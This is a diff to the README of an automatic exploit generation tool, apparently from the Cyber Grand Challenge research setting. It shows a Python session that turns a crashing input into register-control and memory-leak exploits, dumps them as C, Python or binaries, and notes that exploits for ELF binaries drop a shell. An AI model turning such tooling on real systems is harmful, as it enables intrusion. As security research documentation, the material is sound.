@@ -9,7 +9,7 @@ Exploit objects can take a crashing input and will attempt to turn it into an ex
 
 ```python
 # triage a crash
->>> crash = rex.Crash("../binaries-private/defcon24/legit_00003", "\x00\x0b1\xc1\x00\x0c\xeb\xe4\xf1\xf1\x14\r\rM\r\xf3\x1b\r\r\r~\x7f\x1b\xe3\x0c`_222\r\rM\r\xf3\x1b\r\x7f\x002\x7f~\x7f\xe2\xff\x7f\xff\xff\x8b\xc7\xc9\x83\x8b\x0c\xeb\x80\x002\xac\xe2\xff\xff\x00t\x8bt\x8bt_o_\x00t\x8b\xc7\xdd\x83\xc2t~n~~\xac\xe2\xff\xff_k_\x00t\x8b\xc7\xdd\x83\xc2t~n~~\xac\xe2\xff\xff\x00t\x8bt\x8b\xac\xf1\x83\xc2t~c\x00\x00\x00~~\x7f\xe2\xff\xff\x00t\x9e\xac\xe2\xf1\xf2@\x83\xc3t")
+>>> crash = rex.Crash("./legit_00003", "\x00\x0b1\xc1\x00\x0c\xeb\xe4\xf1\xf1\x14\r\rM\r\xf3\x1b\r\r\r~\x7f\x1b\xe3\x0c`_222\r\rM\r\xf3\x1b\r\x7f\x002\x7f~\x7f\xe2\xff\x7f\xff\xff\x8b\xc7\xc9\x83\x8b\x0c\xeb\x80\x002\xac\xe2\xff\xff\x00t\x8bt\x8bt_o_\x00t\x8b\xc7\xdd\x83\xc2t~n~~\xac\xe2\xff\xff_k_\x00t\x8b\xc7\xdd\x83\xc2t~n~~\xac\xe2\xff\xff\x00t\x8bt\x8b\xac\xf1\x83\xc2t~c\x00\x00\x00~~\x7f\xe2\xff\xff\x00t\x9e\xac\xe2\xf1\xf2@\x83\xc3t")
 >>> crash.crash_type
 'write_what_where'
 >>> crash.explorable()
@@ -22,20 +22,22 @@ True
 # generate exploits based off of this crash
 >>> arsenal = crash.exploit()
 # we generated a type 1 POV for every register
->>> arsenal.register_setters.keys()
-['esp', 'edi', 'eax', 'ebp', 'edx', 'ebx', 'esi', 'ecx']
+>>> len(arsenal.register_setters) # we generate one circumstantial register setter, one shellcode register setter
+2
 # and one Type 2 which can leak arbitrary memory
 >>> len(arsenal.leakers)
 1
 # exploits are graded based on reliability, and what kind of defenses they can
-# bypass, the two best exploits put in the 'best_type1' and 'best_type2' attributes
+# bypass, the two best exploits are put into the 'best_type1' and 'best_type2' attributes
 >>> arsenal.best_type1.register
-'esi'
+'ebp'
 # exploits can be dumped in C, Python, or as a compiled POV
->>> arsenal.best_type2.dump_c('legit_x.c')
->>> arsenal.best_type2.dump_python('legit_x.py')
->>> arsenal.best_type2.dump_binary('legit_x.pov')
+>>> arsenal.best_type2.dump_c('legit3_x.c')
+>>> arsenal.best_type2.dump_python('legit3_x.py')
+>>> arsenal.best_type2.dump_binary('legit3_x.pov')
 # also POVs can be tested against a simulation of the CGC architecture
 >>> arsenal.best_type1.test_binary()
 True
 ```
+
+Basic support of Linux ELF binaries also exists, exploits generated for ELF binaries will attempt to drop a shell.
